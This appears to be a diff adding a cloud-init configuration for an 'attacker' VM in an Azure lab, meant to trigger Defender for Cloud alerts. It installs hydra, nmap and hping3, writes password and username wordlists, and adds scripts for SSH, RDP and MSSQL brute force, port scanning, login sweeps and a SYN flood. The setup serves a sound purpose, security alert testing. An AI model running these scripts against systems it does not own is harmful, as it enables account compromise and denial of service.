@@ -1,0 +1,167 @@
+#cloud-config
+# Attacker VM setup: security testing tools
+# Used by azure-lab skill for Defender for Cloud alert simulation
+
+package_update: true
+package_upgrade: false
+
+packages:
+  - hydra
+  - nmap
+  - hping3
+  - medusa
+  - ncrack
+  - sshpass
+  - traceroute
+  - tcpdump
+  - net-tools
+  - curl
+  - netcat-openbsd
+  - python3
+  - python3-pip
+  - freerdp2-x11
+
+write_files:
+  - path: /opt/attacker/wordlist.txt
+    content: |
+      password
+      Password1
+      Password123
+      admin
+      Admin123
+      root
+      toor
+      123456
+      password1
+      qwerty
+      letmein
+      welcome
+      monkey
+      dragon
+      master
+      login
+      abc123
+      P@ssw0rd
+      P@ssword1
+      Summer2024
+      Winter2024
+      Welcome1
+      Passw0rd!
+      Test1234
+      Admin@123
+      azure123
+      Azure@123
+      Labtest1
+      Changeme1
+      Tr0ub4dor
+    permissions: '0644'
+
+  - path: /opt/attacker/userlist.txt
+    content: |
+      root
+      admin
+      administrator
+      azurelabuser
+      user
+      test
+      ubuntu
+      sa
+      postgres
+      mysql
+    permissions: '0644'
+
+  - path: /opt/attacker/ssh-brute.sh
+    content: |
+      #!/bin/bash
+      # SSH brute force against a target IP
+      # Usage: ssh-brute.sh <target_ip> [threads]
+      TARGET="${1:?Usage: ssh-brute.sh <target_ip> [threads]}"
+      THREADS="${2:-4}"
+      echo "[$(date)] Starting SSH brute force against $TARGET with $THREADS threads"
+      hydra -L /opt/attacker/userlist.txt -P /opt/attacker/wordlist.txt \
+        -t "$THREADS" -f -vV ssh://"$TARGET" 2>&1
+      echo "[$(date)] SSH brute force completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/rdp-brute.sh
+    content: |
+      #!/bin/bash
+      # RDP brute force against a target IP
+      # Usage: rdp-brute.sh <target_ip> [threads]
+      TARGET="${1:?Usage: rdp-brute.sh <target_ip> [threads]}"
+      THREADS="${2:-4}"
+      echo "[$(date)] Starting RDP brute force against $TARGET with $THREADS threads"
+      hydra -L /opt/attacker/userlist.txt -P /opt/attacker/wordlist.txt \
+        -t "$THREADS" -f -vV rdp://"$TARGET" 2>&1
+      echo "[$(date)] RDP brute force completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/sql-brute.sh
+    content: |
+      #!/bin/bash
+      # MSSQL brute force against a target IP
+      # Usage: sql-brute.sh <target_ip> [threads]
+      TARGET="${1:?Usage: sql-brute.sh <target_ip> [threads]}"
+      THREADS="${2:-4}"
+      echo "[$(date)] Starting MSSQL brute force against $TARGET with $THREADS threads"
+      hydra -L /opt/attacker/userlist.txt -P /opt/attacker/wordlist.txt \
+        -t "$THREADS" -f -vV mssql://"$TARGET" 2>&1
+      echo "[$(date)] MSSQL brute force completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/port-scan.sh
+    content: |
+      #!/bin/bash
+      # Port scan against a target IP
+      # Usage: port-scan.sh <target_ip>
+      TARGET="${1:?Usage: port-scan.sh <target_ip>}"
+      echo "[$(date)] Starting port scan against $TARGET"
+      nmap -sS -sV -p 1-10000 --reason -T4 "$TARGET" 2>&1
+      echo "[$(date)] Port scan completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/outgoing-ssh-sweep.sh
+    content: |
+      #!/bin/bash
+      # Outgoing SSH connection attempts to many IPs (owned targets only)
+      # Usage: outgoing-ssh-sweep.sh <target_ip_1> <target_ip_2> ...
+      echo "[$(date)] Starting outgoing SSH sweep to $# targets"
+      for TARGET in "$@"; do
+        echo "  Attempting SSH to $TARGET"
+        sshpass -p 'WrongPassword123!' ssh -o StrictHostKeyChecking=no \
+          -o ConnectTimeout=5 -o BatchMode=no \
+          admin@"$TARGET" exit 2>&1 || true
+      done
+      echo "[$(date)] Outgoing SSH sweep completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/outgoing-rdp-sweep.sh
+    content: |
+      #!/bin/bash
+      # Outgoing RDP connection attempts to many IPs (owned targets only)
+      # Usage: outgoing-rdp-sweep.sh <target_ip_1> <target_ip_2> ...
+      echo "[$(date)] Starting outgoing RDP sweep to $# targets"
+      for TARGET in "$@"; do
+        echo "  Attempting RDP to $TARGET"
+        timeout 5 xfreerdp /v:"$TARGET" /u:admin /p:WrongPassword123! \
+          /cert-ignore +auth-only 2>&1 || true
+      done
+      echo "[$(date)] Outgoing RDP sweep completed"
+    permissions: '0755'
+
+  - path: /opt/attacker/ddos-sim.sh
+    content: |
+      #!/bin/bash
+      # DDoS simulation - high-volume traffic to an OWNED target only
+      # Usage: ddos-sim.sh <owned_target_ip> [duration_seconds]
+      TARGET="${1:?Usage: ddos-sim.sh <owned_target_ip> [duration_seconds]}"
+      DURATION="${2:-60}"
+      echo "[$(date)] Starting DDoS simulation against $TARGET for ${DURATION}s"
+      echo "WARNING: Only use against owned targets!"
+      timeout "$DURATION" hping3 -S --flood -p 80 "$TARGET" 2>&1 || true
+      echo "[$(date)] DDoS simulation completed"
+    permissions: '0755'
+
+runcmd:
+  - chmod +x /opt/attacker/*.sh
+  - echo "Attacker tools installation complete" > /opt/attacker/setup-complete.txt
